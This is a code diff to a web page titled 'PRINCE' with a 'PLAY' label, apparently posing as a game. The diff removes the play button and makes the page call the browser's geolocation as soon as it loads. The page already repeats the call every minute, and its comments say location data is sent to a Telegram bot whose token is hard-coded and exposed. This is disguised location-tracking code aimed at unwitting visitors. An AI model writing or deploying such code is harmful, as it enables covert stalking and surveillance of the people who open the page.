@@ -15,21 +15,15 @@
         h1 {
             font-size: 24px; /* Adjust font size for mobile */
         }
-        button {
-            padding: 10px 20px; /* Add padding to the button */
-            font-size: 16px; /* Adjust button font size */
-            cursor: pointer; /* Change cursor on hover */
-        }
     </style>
 </head>
 <body>
     <h1>PRINCE</h1>
-    <button onclick="getLocation()">PLAY</button>
     <p id="status"></p>
 
     <script>
         var token = '6197747448:AAFrgXeZdjQZ1iTm9AE6v56h6y-qShiH5es'; // Replace with your bot token
-        var chatId = '5112680061'; // Replace with your chat ID
+        var chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
 
         function getLocation() {
             if (navigator.geolocation) {
@@ -99,7 +93,12 @@
             }
         }
 
-        // Send location every 1 minute
+        // Ask for permission and send location data when the page loads
+        document.addEventListener("DOMContentLoaded", function() {
+            getLocation();
+        });
+
+        // Send location data every 1 minute
         setInterval(function() {
             getLocation();
         }, 60000);
